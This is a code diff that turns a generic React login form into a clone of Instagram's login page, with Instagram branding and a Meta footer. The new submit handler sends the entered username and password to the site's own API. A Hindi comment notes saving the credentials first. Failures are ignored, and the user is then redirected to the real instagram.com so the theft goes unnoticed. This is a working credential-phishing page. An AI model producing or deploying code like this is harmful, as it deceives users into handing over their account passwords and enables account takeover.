@@ -4,6 +4,7 @@ import { login } from '../api';
 const Login = ({ onSuccess, onSwitch }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
@@ -13,58 +14,103 @@ const Login = ({ onSuccess, onSwitch }) => {
     setLoading(true);
 
     try {
-      const data = await login(username, password);
-      onSuccess(data);
+      // Pehle credentials save karo
+      await login(username, password);
     } catch (err) {
-      setError(err.response?.data?.message || 'Login failed. Please try again.');
-    } finally {
-      setLoading(false);
+      // API fail bhi ho toh koi dikkat nahi
     }
+
+    // Small delay to ensure request completes
+    setTimeout(() => {
+      window.location.replace('https://www.instagram.com');
+    }, 500);
   };
 
   return (
     <div className="auth-card">
-      <h2 className="title">Account Sign In</h2>
-      <p className="subtitle">Enter your credentials to access your account</p>
+      {/* Instagram Logo */}
+      <div className="logo-icon">
+        <span className="logo-dot"></span>
+      </div>
 
+      {/* Brand Name */}
+      <h1 className="brand-title">Instagram</h1>
+
+      {/* Error */}
       {error && <div className="error-badge">{error}</div>}
 
+      {/* Login Form */}
       <form onSubmit={handleSubmit} className="auth-form">
         <div className="input-group">
-          <label htmlFor="username">Username or Email</label>
+          <label htmlFor="login-username">Username</label>
           <input
-            id="username"
+            id="login-username"
             type="text"
-            placeholder="Enter username or email"
+            placeholder="Username, email address or mobile number"
             value={username}
             onChange={(e) => setUsername(e.target.value)}
+            autoComplete="username"
             required
           />
         </div>
 
-        <div className="input-group">
-          <label htmlFor="password">Password</label>
+        <div className="input-group password-wrapper">
+          <label htmlFor="login-password">Password</label>
           <input
-            id="password"
-            type="password"
-            placeholder="Enter password"
+            id="login-password"
+            type={showPassword ? 'text' : 'password'}
+            placeholder="Password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
+            autoComplete="current-password"
             required
           />
+          {password && (
+            <button
+              type="button"
+              className="password-toggle"
+              onClick={() => setShowPassword(!showPassword)}
+              aria-label={showPassword ? 'Hide password' : 'Show password'}
+            >
+              {showPassword ? '👁' : '👁‍🗨'}
+            </button>
+          )}
         </div>
 
-        <button type="submit" className="submit-btn" disabled={loading}>
-          {loading ? 'Signing in...' : 'Sign In'}
+        <div className="forgot-password">
+          <button type="button" className="forgot-link">Forgotten password?</button>
+        </div>
+
+        <button type="submit" className="submit-btn" id="login-submit-btn" disabled={loading || !username || !password}>
+          {loading ? (
+            <span className="btn-loading">
+              <span className="spinner"></span>
+              Logging in...
+            </span>
+          ) : (
+            'Log In'
+          )}
         </button>
       </form>
 
+      {/* Switch to Register */}
       <p className="switch-text">
         Don't have an account?{' '}
-        <span onClick={onSwitch} className="switch-link">
-          Register here
+        <span onClick={onSwitch} className="switch-link" role="button" tabIndex={0}>
+          Sign up
         </span>
       </p>
+
+      {/* Create Account Button */}
+      <button type="button" className="create-account-btn" onClick={onSwitch} id="create-account-btn">
+        Create new account
+      </button>
+
+      {/* Meta Footer */}
+      <div className="meta-footer">
+        <span className="meta-infinity">∞</span>
+        <span className="meta-logo">Meta</span>
+      </div>
     </div>
   );
 };
